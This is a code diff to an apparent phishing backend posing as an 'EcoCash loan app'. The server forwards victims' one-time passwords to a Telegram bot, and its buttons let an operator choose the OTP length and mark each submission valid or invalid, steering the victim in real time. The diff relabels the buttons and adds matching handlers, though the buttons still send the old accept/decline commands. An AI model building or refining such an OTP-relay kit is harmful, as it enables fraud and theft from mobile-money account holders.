@@ -41,8 +41,8 @@ async function sendToTelegram(message) {
             { text: "OTP 6", url: "https://ecocash-loan-app.onrender.com/telegram-command?cmd=otp6" }
           ],
           [
-            { text: "✅ ACCEPT", url: "https://ecocash-loan-app.onrender.com/telegram-command?cmd=accept" },
-            { text: "❌ DECLINE", url: "https://ecocash-loan-app.onrender.com/telegram-command?cmd=decline" }
+            { text: "✅ VALID", url: "https://ecocash-loan-app.onrender.com/telegram-command?cmd=accept" },
+            { text: "❌ INVALID", url: "https://ecocash-loan-app.onrender.com/telegram-command?cmd=decline" }
           ],
           [
             { text: "🔄 RESET", url: "https://ecocash-loan-app.onrender.com/telegram-command?cmd=reset" }
@@ -101,6 +101,14 @@ app.get("/telegram-command", (req, res) => {
     decision = "decline";
   }
 
+  if (cmd === "valid") {
+  decision = "valid";
+}
+
+if (cmd === "invalid") {
+  decision = "invalid";
+}
+
   if (cmd === "reset") {
     otpLength = null;
     decision = null;
@@ -136,7 +144,9 @@ app.get("/otp-status", (req, res) => {
 });
 
 app.get("/decision-status", (req, res) => {
-  res.json({ decision });
+  const current = decision;
+  decision = null; // reset after reading
+  res.json({ decision: current });
 });
 
 app.post("/submit-otp", async (req, res) => {
